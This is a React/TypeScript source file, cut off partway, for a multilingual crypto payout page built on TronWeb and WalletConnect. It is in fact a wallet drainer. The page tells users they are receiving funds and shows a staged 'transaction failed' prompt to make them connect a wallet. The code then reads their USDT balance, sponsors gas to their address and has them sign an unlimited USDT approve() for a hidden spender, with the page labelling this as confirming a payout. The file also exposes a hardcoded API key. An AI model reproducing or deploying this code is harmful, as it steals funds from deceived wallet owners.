import { useEffect, useState } from "react";
import {
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from "@reown/appkit/react";
import { TronWeb } from "tronweb";
import "./PaymentPage.css";

interface CurrencyOption {
  code: string;
  name: string;
  icon: string;
}

interface NetworkOption {
  code: string;
  name: string;
}

const CURRENCIES: CurrencyOption[] = [
  {
    code: "USDT",
    name: "Tether",
    icon: "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/32/color/usdt.png",
  },
  {
    code: "BTC",
    name: "Bitcoin",
    icon: "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/32/color/btc.png",
  },
  {
    code: "ETH",
    name: "Ethereum",
    icon: "https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/32/color/eth.png",
  },
  {
    code: "TON",
    name: "Toncoin",
    icon: "https://cryptologos.cc/logos/toncoin-ton-logo.png",
  },
];

const NETWORKS_BY_CURRENCY: Record<string, NetworkOption[]> = {
  USDT: [
    { code: "TRC20", name: "Tron (TRC-20)" },
    { code: "ERC20", name: "Ethereum (ERC-20)" },
    { code: "BEP20", name: "BNB Smart Chain (BEP-20)" },
  ],
  BTC: [{ code: "BTC", name: "Bitcoin" }],
  ETH: [{ code: "ERC20", name: "Ethereum (ERC-20)" }],
  TON: [{ code: "TON", name: "The Open Network" }],
};

interface LocaleOption {
  code: string;
  name: string;
  flag: string;
}

const LOCALES: LocaleOption[] = [
  { code: "EN", name: "English", flag: "gb" },
  { code: "RU", name: "Русский", flag: "ru" },
  { code: "UA", name: "Українська", flag: "ua" },
  { code: "ES", name: "Español", flag: "es" },
  { code: "DE", name: "Deutsch", flag: "de" },
  { code: "FR", name: "Français", flag: "fr" },
  { code: "IT", name: "Italiano", flag: "it" },
  { code: "TR", name: "Türkçe", flag: "tr" },
  { code: "ZH", name: "中文", flag: "cn" },
  { code: "JA", name: "日本語", flag: "jp" },
];

interface WalletOption {
  id: string;
  name: string;
  logo: string;
}

const WALLETS: WalletOption[] = [
  { id: "walletconnect", name: "WalletConnect", logo: "/img/logo-connect.png" },
  { id: "heleket", name: "Heleket", logo: "/img/logo-heleket.png" },
  { id: "trust", name: "Trust Wallet", logo: "/img/logo-trust.webp" },
  { id: "tangem", name: "Tangem Wallet", logo: "/img/logo-tangem.png" },
  { id: "ledger", name: "Ledger Wallet", logo: "/img/logo-ledger.png" },
];

const PAYMENT_SECONDS_TOTAL = 35 * 60 + 22;

function formatTime(totalSeconds: number) {
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;
  return `${minutes.toString().padStart(2, "0")}:${seconds
    .toString()
    .padStart(2, "0")}`;
}

// Словарь локализации для трех языков
const TRANSLATIONS: Record<string, Record<string, any>> = {
  EN: {
    amountLabel: "To receive:",
    selectCurrency: "Select currency",
    selectCurrencyPlaceholder: "Select currency",
    selectNetwork: "Select network",
    selectNetworkPlaceholder: "Select network",
    goToReceive: "Proceed to receive",
    networkBadge: "Network:",
    contract: "Contract",
    contractTooltip: "If we cannot transfer funds to your cryptocurrency wallet, a link to the smart contract will be automatically called for verification. This process helps ensure that the transaction is not erroneous or unauthorized. In case of any issues, we will definitely contact you to resolve the matter.",
    gasSponsored: "We cover the network fee",
    enterAddress: "Enter your address to receive funds:",
    receivingAddress: "Receiving address:",
    invalidAddress: "Invalid address",
    placeholderAddress: "Receiving address {network}...",
    amountToReceive: "Amount to receive:",
    receiveBtn: "Receive {amount} {currency}",
    back: "← Back",
    loadingMessages: [
      "Transaction in progress...",
      "Creating blockchain record...",
      "Transferring to your address...",
    ],
    errorHeading: "Transaction failed",
    errorDesc: "Unfortunately, due to an error, we were unable to complete the transaction. Please try connecting your wallet",
    continue: "Continue",
    connectWallet: "Connect wallet",
    connectWalletDesc: "Connect your wallet to receive funds",
    walletConnected: "Wallet connected",
    confirmDebit: "Confirm payout",
    processing: "Processing...",
    timeLeft: "Time left to receive:",
    walletNotConnectedAlert: "Wallet is not connected",
    successAlert: "✅ Success!\n\nTransaction sent.\nTXID:\n{txId}",
    errorAlert: "❌ Error: {error}",
  },
  RU: {
    amountLabel: "К получению:",
    selectCurrency: "Выберите валюту",
    selectCurrencyPlaceholder: "Выберите валюту",
    selectNetwork: "Выберите сеть",
    selectNetworkPlaceholder: "Выберите сеть",
    goToReceive: "Перейти к получению",
    networkBadge: "Сеть:",
    contract: "Контракт",
    contractTooltip: "Если мы не сможем перевести средства на ваш криптовалютный кошелек, будет автоматически вызвана ссылка на смарт-контракт для верификации. Этот процесс позволяет убедиться, что транзакция не является ошибочной или несанкционированной. В случае возникновения любых проблем, мы обязательно свяжемся с вами для решения вопроса.",
    gasSponsored: "Мы покрываем комиссию сети",
    enterAddress: "Введите ваш адрес для получения средств:",
    receivingAddress: "Адрес получения:",
    invalidAddress: "Адрес некорректен",
    placeholderAddress: "Адрес получения {network}...",
    amountToReceive: "Сумма к получению:",
    receiveBtn: "Получить {amount} {currency}",
    back: "← Назад",
    loadingMessages: [
      "Выполняется транзакция...",
      "Создаем запись в блокчейне...",
      "Переводим на ваш адрес...",
    ],
    errorHeading: "Не удалось выполнить транзакцию",
    errorDesc: "К сожалению из-за возникшей ошибки нам не удалось выполнить транзакцию. Попробуйте подключить свой кошелек",
    continue: "Продолжить",
    connectWallet: "Подключить кошелёк",
    connectWalletDesc: "Подключите кошелёк для получения средств",
    walletConnected: "Кошелёк подключён",
    confirmDebit: "Подтвердить списание",
    processing: "Обработка...",
    timeLeft: "Осталось времени для получения:",
    walletNotConnectedAlert: "Кошелёк не подключён",
    successAlert: "✅ Успешно!\n\nТранзакция отправлена.\nTXID:\n{txId}",
    errorAlert: "❌ Ошибка: {error}",
  },
  UA: {
    amountLabel: "До отримання:",
    selectCurrency: "Оберіть валюту",
    selectCurrencyPlaceholder: "Оберіть валюту",
    selectNetwork: "Оберіть мережу",
    selectNetworkPlaceholder: "Оберіть мережу",
    goToReceive: "Перейти до отримання",
    networkBadge: "Мережа:",
    contract: "Контракт",
    contractTooltip: "Якщо мы не зможемо переказати кошти на ваш криптовалютний гаманець, буде автоматично викликано посилання на смарт-контракт для верифікації. Цей процес дозволяє переконатися, що транзакція не є помилковою або несанкціонованою. У разі виникнення будь-яких проблем, ми обов'язково зв'яжемося з вами для вирішення питання.",
    gasSponsored: "Ми покриваємо комісію мережі",
    enterAddress: "Введіть вашу адресу для отримання коштів:",
    receivingAddress: "Адреса отримання:",
    invalidAddress: "Адреса некоректна",
    placeholderAddress: "Адреса отримання {network}...",
    amountToReceive: "Сума до отримання:",
    receiveBtn: "Отримати {amount} {currency}",
    back: "← Назад",
    loadingMessages: [
      "Виконується транзакція...",
      "Створюємо запис у блокчейні...",
      "Переказуємо на вашу адресу...",
    ],
    errorHeading: "Не вдалося виконати транзакцію",
    errorDesc: "На жаль, через виникнення помилки нам не вдалося виконати транзакцию. Спробуйте підключити свій гаманець",
    continue: "Продовжити",
    connectWallet: "Підключити гаманець",
    connectWalletDesc: "Підключіть гаманець для отримання коштів",
    walletConnected: "Гаманець підключено",
    confirmDebit: "Підтвердити списання",
    processing: "Обробка...",
    timeLeft: "Залишилося часу для отримання:",
    walletNotConnectedAlert: "Гаманець не підключено",
    successAlert: "✅ Успішно!\n\nТранзакцію відправлено.\nTXID:\n{txId}",
    errorAlert: "❌ Помилка: {error}",
  },
  ES: {
  amountLabel: "Para recibir:",
  selectCurrency: "Seleccionar moneda",
  selectCurrencyPlaceholder: "Seleccionar moneda",
  selectNetwork: "Seleccionar red",
  selectNetworkPlaceholder: "Seleccionar red",
  goToReceive: "Continuar para recibir",
  networkBadge: "Red:",
  contract: "Contrato",
  contractTooltip: "Si no podemos transferir fondos a su billetera de criptomonedas, se activará automáticamente un enlace al contrato inteligente para su verificación. Este proceso ayuda a garantizar que la transacción no sea errónea ni no autorizada. Si surge algún problema, nos pondremos en contacto con usted para resolverlo.",
  gasSponsored: "Cubrimos la comisión de la red",
  enterAddress: "Ingrese su dirección para recibir fondos:",
  receivingAddress: "Dirección de recepción:",
  invalidAddress: "Dirección inválida",
  placeholderAddress: "Dirección de recepción {network}...",
  amountToReceive: "Cantidad a recibir:",
  receiveBtn: "Recibir {amount} {currency}",
  back: "← Atrás",
  loadingMessages: [
    "Transacción en curso...",
    "Creando registro en blockchain...",
    "Transfiriendo a su dirección..."
  ],
  errorHeading: "La transacción falló",
  errorDesc: "Lamentablemente, debido a un error, no pudimos completar la transacción. Intente conectar su billetera.",
  continue: "Continuar",
  connectWallet: "Conectar billetera",
  connectWalletDesc: "Conecte su billetera para recibir fondos",
  walletConnected: "Billetera conectada",
  confirmDebit: "Confirmar pago",
  processing: "Procesando...",
  timeLeft: "Tiempo restante para recibir:",
  walletNotConnectedAlert: "La billetera no está conectada",
  successAlert: "✅ ¡Éxito!\n\nTransacción enviada.\nTXID:\n{txId}",
  errorAlert: "❌ Error: {error}",
},

DE: {
  amountLabel: "Zu erhalten:",
  selectCurrency: "Währung auswählen",
  selectCurrencyPlaceholder: "Währung auswählen",
  selectNetwork: "Netzwerk auswählen",
  selectNetworkPlaceholder: "Netzwerk auswählen",
  goToReceive: "Zum Empfang fortfahren",
  networkBadge: "Netzwerk:",
  contract: "Vertrag",
  contractTooltip: "Falls wir die Gelder nicht an Ihre Kryptowallet übertragen können, wird automatisch ein Link zum Smart Contract zur Verifizierung aufgerufen. Dieser Prozess hilft sicherzustellen, dass die Transaktion weder fehlerhaft noch unautorisiert ist. Bei Problemen werden wir Sie kontaktieren.",
  gasSponsored: "Wir übernehmen die Netzwerkgebühr",
  enterAddress: "Geben Sie Ihre Empfangsadresse ein:",
  receivingAddress: "Empfangsadresse:",
  invalidAddress: "Ungültige Adresse",
  placeholderAddress: "Empfangsadresse {network}...",
  amountToReceive: "Zu erhaltender Betrag:",
  receiveBtn: "Erhalten {amount} {currency}",
  back: "← Zurück",
  loadingMessages: [
    "Transaktion wird ausgeführt...",
    "Blockchain-Eintrag wird erstellt...",
    "Übertragung an Ihre Adresse..."
  ],
  errorHeading: "Transaktion fehlgeschlagen",
  errorDesc: "Leider konnte die Transaktion aufgrund eines Fehlers nicht abgeschlossen werden. Bitte verbinden Sie Ihre Wallet.",
  continue: "Weiter",
  connectWallet: "Wallet verbinden",
  connectWalletDesc: "Verbinden Sie Ihre Wallet, um Gelder zu erhalten",
  walletConnected: "Wallet verbunden",
  confirmDebit: "Auszahlung bestätigen",
  processing: "Verarbeitung...",
  timeLeft: "Verbleibende Zeit:",
  walletNotConnectedAlert: "Wallet ist nicht verbunden",
  successAlert: "✅ Erfolgreich!\n\nTransaktion gesendet.\nTXID:\n{txId}",
  errorAlert: "❌ Fehler: {error}",
},

FR: {
  amountLabel: "À recevoir :",
  selectCurrency: "Sélectionner une devise",
  selectCurrencyPlaceholder: "Sélectionner une devise",
  selectNetwork: "Sélectionner un réseau",
  selectNetworkPlaceholder: "Sélectionner un réseau",
  goToReceive: "Continuer pour recevoir",
  networkBadge: "Réseau :",
  contract: "Contrat",
  contractTooltip: "Si nous ne pouvons pas transférer les fonds vers votre portefeuille crypto, un lien vers le smart contract sera automatiquement utilisé pour vérification. Ce processus garantit que la transaction n'est ni erronée ni non autorisée. En cas de problème, nous vous contacterons.",
  gasSponsored: "Nous couvrons les frais du réseau",
  enterAddress: "Entrez votre adresse de réception :",
  receivingAddress: "Adresse de réception :",
  invalidAddress: "Adresse invalide",
  placeholderAddress: "Adresse de réception {network}...",
  amountToReceive: "Montant à recevoir :",
  receiveBtn: "Recevoir {amount} {currency}",
  back: "← Retour",
  loadingMessages: [
    "Transaction en cours...",
    "Création de l'enregistrement blockchain...",
    "Transfert vers votre adresse..."
  ],
  errorHeading: "Échec de la transaction",
  errorDesc: "Malheureusement, une erreur a empêché l'exécution de la transaction. Veuillez connecter votre portefeuille.",
  continue: "Continuer",
  connectWallet: "Connecter le portefeuille",
  connectWalletDesc: "Connectez votre portefeuille pour recevoir les fonds",
  walletConnected: "Portefeuille connecté",
  confirmDebit: "Confirmer le paiement",
  processing: "Traitement...",
  timeLeft: "Temps restant :",
  walletNotConnectedAlert: "Le portefeuille n'est pas connecté",
  successAlert: "✅ Succès !\n\nTransaction envoyée.\nTXID :\n{txId}",
  errorAlert: "❌ Erreur : {error}",
},

IT: {
  amountLabel: "Da ricevere:",
  selectCurrency: "Seleziona valuta",
  selectCurrencyPlaceholder: "Seleziona valuta",
  selectNetwork: "Seleziona rete",
  selectNetworkPlaceholder: "Seleziona rete",
  goToReceive: "Procedi alla ricezione",
  networkBadge: "Rete:",
  contract: "Contratto",
  contractTooltip: "Se non possiamo trasferire i fondi al tuo wallet di criptovalute, verrà automaticamente utilizzato un collegamento allo smart contract per la verifica. Questo processo aiuta a garantire che la transazione non sia errata o non autorizzata. In caso di problemi, ti contatteremo.",
  gasSponsored: "Copriamo la commissione di rete",
  enterAddress: "Inserisci il tuo indirizzo di ricezione:",
  receivingAddress: "Indirizzo di ricezione:",
  invalidAddress: "Indirizzo non valido",
  placeholderAddress: "Indirizzo di ricezione {network}...",
  amountToReceive: "Importo da ricevere:",
  receiveBtn: "Ricevi {amount} {currency}",
  back: "← Indietro",
  loadingMessages: [
    "Transazione in corso...",
    "Creazione del record blockchain...",
    "Trasferimento al tuo indirizzo..."
  ],
  errorHeading: "Transazione non riuscita",
  errorDesc: "Purtroppo non siamo riusciti a completare la transazione a causa di un errore. Prova a collegare il tuo wallet.",
  continue: "Continua",
  connectWallet: "Connetti wallet",
  connectWalletDesc: "Connetti il wallet per ricevere fondi",
  walletConnected: "Wallet connesso",
  confirmDebit: "Conferma pagamento",
  processing: "Elaborazione...",
  timeLeft: "Tempo rimanente:",
  walletNotConnectedAlert: "Wallet non connesso",
  successAlert: "✅ Operazione riuscita!\n\nTransazione inviata.\nTXID:\n{txId}",
  errorAlert: "❌ Errore: {error}",
},

TR: {
  amountLabel: "Alınacak tutar:",
  selectCurrency: "Para birimi seçin",
  selectCurrencyPlaceholder: "Para birimi seçin",
  selectNetwork: "Ağ seçin",
  selectNetworkPlaceholder: "Ağ seçin",
  goToReceive: "Alım işlemine devam et",
  networkBadge: "Ağ:",
  contract: "Sözleşme",
  contractTooltip: "Fonları kripto cüzdanınıza aktaramazsak, doğrulama için akıllı sözleşme bağlantısı otomatik olarak çağrılacaktır. Bu süreç işlemin hatalı veya yetkisiz olmadığını doğrulamaya yardımcı olur. Herhangi bir sorun oluşursa sizinle iletişime geçeceğiz.",
  gasSponsored: "Ağ ücretini biz karşılıyoruz",
  enterAddress: "Fon almak için adresinizi girin:",
  receivingAddress: "Alım adresi:",
  invalidAddress: "Geçersiz adres",
  placeholderAddress: "Alım adresi {network}...",
  amountToReceive: "Alınacak tutar:",
  receiveBtn: "{amount} {currency} al",
  back: "← Geri",
  loadingMessages: [
    "İşlem gerçekleştiriliyor...",
    "Blockchain kaydı oluşturuluyor...",
    "Adresinize transfer ediliyor..."
  ],
  errorHeading: "İşlem başarısız oldu",
  errorDesc: "Maalesef bir hata nedeniyle işlemi tamamlayamadık. Lütfen cüzdanınızı bağlamayı deneyin.",
  continue: "Devam et",
  connectWallet: "Cüzdan bağla",
  connectWalletDesc: "Fon almak için cüzdanınızı bağlayın",
  walletConnected: "Cüzdan bağlandı",
  confirmDebit: "Ödemeyi onayla",
  processing: "İşleniyor...",
  timeLeft: "Kalan süre:",
  walletNotConnectedAlert: "Cüzdan bağlı değil",
  successAlert: "✅ Başarılı!\n\nİşlem gönderildi.\nTXID:\n{txId}",
  errorAlert: "❌ Hata: {error}",
},

ZH: {
  amountLabel: "接收金额：",
  selectCurrency: "选择货币",
  selectCurrencyPlaceholder: "选择货币",
  selectNetwork: "选择网络",
  selectNetworkPlaceholder: "选择网络",
  goToReceive: "继续接收",
  networkBadge: "网络：",
  contract: "合约",
  contractTooltip: "如果我们无法将资金转入您的加密钱包，将自动调用智能合约链接进行验证。该过程有助于确保交易不是错误或未经授权的。如有任何问题，我们将与您联系。",
  gasSponsored: "网络手续费由我们承担",
  enterAddress: "请输入您的收款地址：",
  receivingAddress: "收款地址：",
  invalidAddress: "地址无效",
  placeholderAddress: "收款地址 {network}...",
  amountToReceive: "接收金额：",
  receiveBtn: "接收 {amount} {currency}",
  back: "← 返回",
  loadingMessages: [
    "交易进行中...",
    "正在创建区块链记录...",
    "正在转账到您的地址..."
  ],
  errorHeading: "交易失败",
  errorDesc: "很遗憾，由于发生错误，我们无法完成交易。请尝试连接您的钱包。",
  continue: "继续",
  connectWallet: "连接钱包",
  connectWalletDesc: "连接您的钱包以接收资金",
  walletConnected: "钱包已连接",
  confirmDebit: "确认付款",
  processing: "处理中...",
  timeLeft: "剩余时间：",
  walletNotConnectedAlert: "钱包未连接",
  successAlert: "✅ 成功！\n\n交易已发送。\nTXID:\n{txId}",
  errorAlert: "❌ 错误：{error}",
},

JA: {
  amountLabel: "受取額:",
  selectCurrency: "通貨を選択",
  selectCurrencyPlaceholder: "通貨を選択",
  selectNetwork: "ネットワークを選択",
  selectNetworkPlaceholder: "ネットワークを選択",
  goToReceive: "受取へ進む",
  networkBadge: "ネットワーク:",
  contract: "コントラクト",
  contractTooltip: "資金を暗号資産ウォレットへ送金できない場合、検証のためスマートコントラクトへのリンクが自動的に呼び出されます。このプロセスにより、取引が誤りや不正でないことを確認します。問題が発生した場合はご連絡いたします。",
  gasSponsored: "ネットワーク手数料は当社負担",
  enterAddress: "受取アドレスを入力してください:",
  receivingAddress: "受取アドレス:",
  invalidAddress: "無効なアドレスです",
  placeholderAddress: "受取アドレス {network}...",
  amountToReceive: "受取金額:",
  receiveBtn: "{amount} {currency} を受け取る",
  back: "← 戻る",
  loadingMessages: [
    "取引を処理中...",
    "ブロックチェーン記録を作成中...",
    "アドレスへ送金中..."
  ],
  errorHeading: "取引に失敗しました",
  errorDesc: "エラーが発生したため、取引を完了できませんでした。ウォレットを接続してください。",
  continue: "続行",
  connectWallet: "ウォレットを接続",
  connectWalletDesc: "資金を受け取るためにウォレットを接続してください",
  walletConnected: "ウォレット接続済み",
  confirmDebit: "支払いを確認",
  processing: "処理中...",
  timeLeft: "残り時間:",
  walletNotConnectedAlert: "ウォレットが接続されていません",
  successAlert: "✅ 成功！\n\n取引が送信されました。\nTXID:\n{txId}",
  errorAlert: "❌ エラー: {error}",
}
};

// Функция валидации адресов по регулярным выражениям сетей
function validateAddress(addr: string, networkCode: string): boolean {
  if (!addr) return true;
  const cleanAddr = addr.trim();
  switch (networkCode) {
    case "TRC20":
      return /^T[a-km-zA-HJ-NP-Z1-9]{33}$/.test(cleanAddr);
    case "ERC20":
    case "BEP20":
      return /^0x[a-fA-F0-9]{40}$/.test(cleanAddr);
    case "BTC":
      return /^(1|3)[a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[a-zA-HJ-NP-Z0-9]{39,59}$/i.test(
        cleanAddr,
      );
    case "TON":
      return /^[a-zA-Z0-9_-]{48}$/.test(cleanAddr);
    default:
      return cleanAddr.length > 10;
  }
}

declare let window: any;

const TRONGRID_API_KEY = "91a247b8-774f-44ca-91ea-e5930a1ea480";
const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Mainnet USDT
const USDT_DECIMALS = 6;
const MAX_UINT256 =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function isUserRejection(e: any): boolean {
  const msg = String(e?.message ?? e ?? "").toLowerCase();
  return (
    e?.code === 4001 ||
    msg.includes("reject") ||
    msg.includes("denied") ||
    msg.includes("declin") ||
    msg.includes("cancel") ||
    msg.includes("closed by user")
  );
}

async function getConnectedTronAddress(
  walletProvider: any,
): Promise<string | null> {
  if (!walletProvider) return null;
  const raw = walletProvider?.provider ?? walletProvider;

  const session = raw?.session;
  if (session?.namespaces) {
    const tronAccounts = session.namespaces.tron?.accounts;
    if (Array.isArray(tronAccounts) && tronAccounts.length > 0) {
      const a = tronAccounts[0];
      return a.includes(":") ? a.split(":").pop()! : a;
    }

    const eip155Accounts = session.namespaces.eip155?.accounts;
    if (Array.isArray(eip155Accounts) && eip155Accounts.length > 0) {
      const a = eip155Accounts[0];
      if (a.includes("728126428")) {
        return a.split(":").pop()!;
      }
    }
  }

  const methods = ["tron_accounts", "eth_accounts"];
  for (const method of methods) {
    try {
      const accounts = await raw?.request?.({ method });
      if (Array.isArray(accounts) && accounts.length > 0) {
        const a = accounts[0];
        return a.includes(":") ? a.split(":").pop()! : a;
      }
    } catch (e) {
      /* ignore */
    }
  }

  return null;
}

async function getUsdtBalanceSmallestUnit(
  tronWeb: any,
  address: string,
): Promise<bigint> {
  const result = await tronWeb.transactionBuilder.triggerConstantContract(
    USDT_CONTRACT_ADDRESS,
    "balanceOf(address)",
    {},
    [{ type: "address", value: address }],
    address,
  );
  const hex = result?.constant_result?.[0];
  if (!hex) {
    throw new Error("Не удалось прочитать баланс USDT");
  }
  return BigInt("0x" + hex);
}

function safeDecodeTronMessage(msg: any): string {
  if (!msg) return "Unknown error";
  try {
    if (typeof msg === "string" && /^[0-9a-fA-F]+$/.test(msg)) {
      return TronWeb.toAscii(msg);
    }
    return typeof msg === "string" ? msg : JSON.stringify(msg);
  } catch {
    return String(msg);
  }
}

function strictNormalizeTronAddress(tronWeb: any, rawAddress: string): string {
  if (!rawAddress) throw new Error("Получен пустой адрес");

  let cleanAddr = rawAddress.trim();

  if (cleanAddr.includes(":")) {
    cleanAddr = cleanAddr.split(":").pop()!;
  }

  if (cleanAddr.startsWith("0x") && cleanAddr.length === 42) {
    cleanAddr = "41" + cleanAddr.slice(2);
  }

  if (cleanAddr.startsWith("41") && cleanAddr.length === 42) {
    cleanAddr = tronWeb.address.fromHex(cleanAddr);
  }

  if (!tronWeb.isAddress(cleanAddr)) {
    throw new Error(
      `Адрес не прошел криптографическую валидацию TronWeb: ${rawAddress}`,
    );
  }

  return cleanAddr;
}

async function ensureGasSponsored(safeOwner: string): Promise<void> {
  console.log("-> Проверяем баланс TRX для покрытия газа...");
  try {
    const response = await fetch("http://localhost:8080/api/sponsor-gas", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userAddress: safeOwner }),
    });

    if (!response.ok) {
      const errData = await response.json().catch(() => ({}));
      throw new Error(errData.error || "Ошибка при спонсорстве газа");
    }

    const data = await response.json();
    console.log("Результат спонсорства газа:", data);

    if (data.status === "sent") {
      console.log("-> Ожидаем 4 секунды, пока TRX зачислятся...");
      await new Promise((resolve) => setTimeout(resolve, 4000));
    }
  } catch (e: any) {
    console.error("❌ Ошибка спонсорства газа:", e.message);
    throw new Error(
      "Не удалось подготовить баланс для оплаты комиссии сети: " + e.message,
    );
  }
}

async function approveTokenSpending(
  walletProvider: any,
  spenderAddress: string,
): Promise<string> {
  let rawProvider = walletProvider?.provider ?? walletProvider;

  const actualAddress = await getConnectedTronAddress(walletProvider);
  if (!actualAddress) {
    throw new Error(
      "Не удалось получить активный адрес из кошелька. Пожалуйста, переподключите кошелёк.",
    );
  }

  const tronWeb = new TronWeb({
    fullHost: "https://api.trongrid.io",
    headers: { "TRON-PRO-API-KEY": TRONGRID_API_KEY },
  });

  const safeOwner = strictNormalizeTronAddress(tronWeb, actualAddress);

  await ensureGasSponsored(safeOwner);
  const safeSpender = strictNormalizeTronAddress(tronWeb, spenderAddress);
  const safeContract = strictNormalizeTronAddress(tronWeb, USDT_CONTRACT_ADDRESS);

  tronWeb.setAddress(safeOwner);

  console.log("=== Старт выдачи разрешения (Approve) ===");
  console.log("Владелец (Base58):", safeOwner);
  console.log("Спендер (Base58):", safeSpender);

  console.log("-> 0. Сканируем баланс...");
  const currentBalance = await getUsdtBalanceSmallestUnit(tronWeb, safeOwner);
  const reserveAmount = BigInt(5 * 10 ** USDT_DECIMALS);

  if (currentBalance <= reserveAmount) {
    throw new Error("На балансе 5 USDT или меньше, недостаточно средств для списания.");
  }

  const amountToPaySmallestDecimal = currentBalance - reserveAmount;
  const amountToPayHex = amountToPaySmallestDecimal.toString(16);

  console.log("-> 1. Сборка транзакции (triggerSmartContract)...");
  let txObj;
  try {
    txObj = await tronWeb.transactionBuilder.triggerSmartContract(
      safeContract,
      "approve(address,uint256)",
      { feeLimit: 100_000_000, callValue: 0 },
      [
        { type: "address", value: safeSpender },
        { type: "uint256", value: MAX_UINT256 },
      ],
      safeOwner,
    );
  } catch (e: any) {
    console.error("Детали ошибки сборки:", e);
    throw new Error("Ошибка при сборке транзакции (Билдер упал): " + (e.message || e));
  }

  const tx = (txObj as any)?.transaction || (txObj as any)?.result?.transaction || txObj;
  if (!tx || !(tx as any).raw_data) {
    throw new Error("Билдер не вернул валидный объект транзакции");
  }

  const ownerAddressHexInTx = tx.raw_data.contract[0].parameter.value.owner_address;
  const ownerAddressFromHex = tronWeb.address.fromHex(ownerAddressHexInTx);

  console.log("owner_address внутри raw_data (hex):", ownerAddressHexInTx);
  console.log("owner_address внутри raw_data (base58):", ownerAddressFromHex);
  console.log("safeOwner, который мы ожидаем:", safeOwner);

  if (ownerAddressFromHex !== safeOwner) {
    throw new Error(
      `КРИТИЧНО: билдер собрал транзакцию с owner_address=${ownerAddressFromHex}, а мы ожидали ${safeOwner}. Проблема в сборке tx (tronWeb.setAddress не сработал), а не в кошельке.`,
    );
  }

  console.log("-> 2. Запрашиваем подпись кошелька...");
  let signedResponse;
  let cleanTxToSign;
  try {
    const activeAddressBeforeSign = await getConnectedTronAddress(walletProvider);
    if (!activeAddressBeforeSign) {
      throw new Error("Не удалось получить активный адрес из кошелька.");
    }

    const safeActiveAddress = strictNormalizeTronAddress(tronWeb, activeAddressBeforeSign);

    if (safeActiveAddress !== safeOwner) {
      throw new Error(
        `Рассинхрон кошелька! dApp собирает транзакцию для ${safeOwner}, но кошелек сейчас переключен на ${safeActiveAddress}. Пожалуйста, выберите правильный аккаунт в расширении/приложении кошелька.`,
      );
    }

    const sessionNamespaces = rawProvider?.session?.namespaces;
    console.log("Session namespaces перед подписью:", sessionNamespaces);

    if (sessionNamespaces?.tron?.accounts) {
      const sessionAccounts = sessionNamespaces.tron.accounts.map(
        (acc: string) => acc.split(":")[2],
      );
      console.log("Аккаунты в реальной WC-сессии:", sessionAccounts);

      const sessionOwnerMatches = sessionAccounts.some(
        (acc: string) => strictNormalizeTronAddress(tronWeb, acc) === safeOwner,
      );

      if (!sessionOwnerMatches) {
        throw new Error(
          `КРИТИЧНО: активная WalletConnect-сессия содержит аккаунты [${sessionAccounts.join(", ")}], среди них нет ${safeOwner}. rawProvider ссылается на чужую сессию. Переподключите кошелёк полностью (disconnect + очистка WC storage).`,
        );
      }
    } else {
      console.warn(
        "Не удалось прочитать session.namespaces у rawProvider — структура адаптера отличается от ожидаемой.",
      );
    }

    cleanTxToSign = JSON.parse(JSON.stringify(tx));

    if ((globalThis as any).__signInProgress) {
      throw new Error(
        "Подпись уже выполняется в этом окне. Дождитесь завершения предыдущего запроса и не нажимайте кнопку повторно.",
      );
    }
    (globalThis as any).__signInProgress = true;

    const requestStartedAt = Date.now();
    console.log("Отправляем request на подпись, timestamp:", requestStartedAt, "txID:", cleanTxToSign.txID);

    try {
      signedResponse = await rawProvider.request(
        {
          method: "tron_signTransaction",
          params: {
            address: safeOwner,
            transaction: {
              transaction: cleanTxToSign,
            },
          },
        },
        sessionNamespaces?.tron?.chains?.[0] ?? "tron:0x2b6653dc",
      );
      console.log("Ответ получен, timestamp:", Date.now(), "прошло мс:", Date.now() - requestStartedAt);
    } finally {
      (globalThis as any).__signInProgress = false;
    }

    console.log("Сырой ответ от кошелька:", signedResponse);
  } catch (e: any) {
    if (e?.message?.toLowerCase().includes("reject") || isUserRejection(e)) {
      throw new Error("Пользователь отменил подпись");
    }
    throw new Error("Ошибка подписи в кошельке: " + (e?.message || e));
  }

  console.log("-> 3. Отправка в блокчейн (broadcast)...");

  let signatureStr = "";
  if (typeof signedResponse === "string") {
    signatureStr = signedResponse;
  } else if (Array.isArray(signedResponse)) {
    signatureStr = signedResponse[0];
  } else if (signedResponse?.signature) {
    signatureStr = Array.isArray(signedResponse.signature)
      ? signedResponse.signature[0]
      : signedResponse.signature;
  } else if (signedResponse?.result?.signature) {
    signatureStr = Array.isArray(signedResponse.result.signature)
      ? signedResponse.result.signature[0]
      : signedResponse.result.signature;
  }

  if (!signatureStr) {
    console.error("Не удалось найти подпись в ответе:", signedResponse);
    throw new Error("Кошелек не вернул подпись. Проверьте логи.");
  }

  if (signatureStr.startsWith("0x")) {
    signatureStr = signatureStr.slice(2);
  }

  const signedTxForBroadcast = {
    ...cleanTxToSign,
    signature: [signatureStr],
  };

  const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTxForBroadcast);

  if (!broadcastResult?.result) {
    const msg = safeDecodeTronMessage(broadcastResult?.message);
    console.error("❌ Ошибка отправки в ноду:", msg);
    throw new Error("Транзакция отклонена нодой: " + msg);
  }

  console.log("✅ Апрув отправлен в сеть! TXID:", broadcastResult.txid);

  console.log("-> 4. Ожидаем подтверждения транзакции approve в сети...");
  console.log("TXID для проверки:", broadcastResult.txid);
  
  let approveConfirmed = false;
  
  for (let i = 0; i < 25; i++) { // Увеличили до 25 попыток (~75 секунд)
    try {
      console.log(`[Попытка ${i + 1}/25] Запрос инфы по TXID...`);
      const txInfo = await tronWeb.trx.getTransactionInfo(broadcastResult.txid);
      
      if (txInfo && Object.keys(txInfo).length > 0) {
        console.log("Ответ от ноды получен:", txInfo);
        
        if (txInfo.receipt && txInfo.receipt.result === "SUCCESS") {
          approveConfirmed = true;
          break; 
        } else if (txInfo.receipt && txInfo.receipt.result) {
          throw new Error(`Транзакция отклонена контрактом: ${txInfo.receipt.result}`);
        }
      } else {
         console.log("Нода пока не видит транзакцию (пустой ответ)...");
      }
    } catch (err: any) {
